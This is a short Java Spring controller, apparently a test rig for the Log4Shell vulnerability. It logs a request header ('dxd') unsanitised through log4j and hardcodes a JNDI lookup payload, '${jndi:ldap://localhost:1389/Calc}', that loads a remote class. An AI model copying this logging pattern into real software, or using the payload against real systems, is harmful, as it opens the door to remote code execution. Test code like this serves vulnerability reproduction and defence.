package com.example.demo.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping()
@Deprecated
public class TestLogController {
    public static final Logger logger = LogManager.getLogger();


    @PostMapping("/go")
    public String go(HttpServletRequest request, String url) {
        String headerAuthorization = request.getHeader("dxd");
        logger.info("进来了");
        logger.info("收到" + headerAuthorization);
        logger.info("出去了");
        logger.error("${jndi:ldap://localhost:1389/Calc}");
        return headerAuthorization;

    }
}
